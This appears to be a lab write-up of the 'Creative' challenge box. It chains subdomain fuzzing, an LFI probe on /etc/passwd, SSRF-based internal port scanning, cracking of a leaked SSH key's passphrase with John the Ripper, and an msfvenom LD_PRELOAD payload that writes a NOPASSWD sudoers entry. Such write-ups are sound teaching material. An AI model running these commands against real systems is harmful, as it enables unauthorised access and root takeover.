02 Web Enumeration

Add the domain to the local hosts file:

bashUpdate /etc/hosts
echo "10.114.165.52 creative.thm" | sudo tee -a /etc/hosts

Directory Fuzzing

bashGobuster Dir
gobuster dir -u http://creative.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

No interesting directories found. Pivot to subdomain enumeration.

Subdomain Fuzzing

bashGobuster DNS
gobuster dns -d creative.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
Subdomain discovered ✔️

03 Parameter Analysis & SSRF Discovery

Manual parameter testing revealed unsanitized input:

urlLFI Attempt
http://creative.thm/?contact-message=/etc/passwd

Application did not sanitize the parameter — hints at file interaction and possible SSRF.

Further testing on the discovered subdomain confirmed a Server-Side Request Forgery (SSRF) vulnerability.

🚨 SSRF allows the server to make requests on your behalf — including to internal services not exposed externally.

04 Internal Port Discovery via SSRF

A custom script was written to fuzz internal ports through the SSRF endpoint, probing 127.0.0.1:PORT for each port.

05 SSH Key Exposure

Interacting with port 1337 via SSRF revealed an SSH private key (id_rsa). The key was passphrase-protected.

Cracking the Passphrase

Convert the key to a crackable hash format:

bashConvert Key for John
ssh2john id_rsa > hash.txt

Crack with John the Ripper:

bashCrack Passphrase
john hash.txt
Passphrase retrieved ✔️

06 Initial Access

bashSSH Login
chmod 600 id_rsa
ssh -i id_rsa saad@10.114.165.52
# Enter cracked passphrase when prompted
Shell obtained as user saad ✔️

07 Privilege Escalation

User saad had sudo access to specific binaries. Exploit using LD_PRELOAD to inject a malicious shared object.

Step 1 — Generate Payload

bashmsfvenom — Shared Object Payload
msfvenom -p linux/x64/exec \
  CMD="echo 'saad ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/saad" \
  AppendExit=true -f elf-so -o pwn.so

Step 2 — Upload to Target

bashSCP Upload
scp -i id_rsa pwn.so saad@10.114.165.52:/tmp/

Step 3 — Trigger via LD_PRELOAD

bashExecute Payload
sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/ping
Full sudo privileges granted to saad ✔️

sudo su

10 Key Takeaways

  • Always test parameters manually — automated tools miss SSRF vectors.
  • SSRF can expose internal services invisible from outside.
  • Internal port fuzzing via SSRF is a powerful lateral technique.
  • Exposed SSH keys are dangerous even when passphrase-protected — they're often crackable.
  • Misconfigured sudo + LD_PRELOAD = instant root.
Final Thought: Creative demonstrates a clean chained attack — SSRF → Key Leak → Passphrase Crack → LD_PRELOAD Abuse = full compromise.
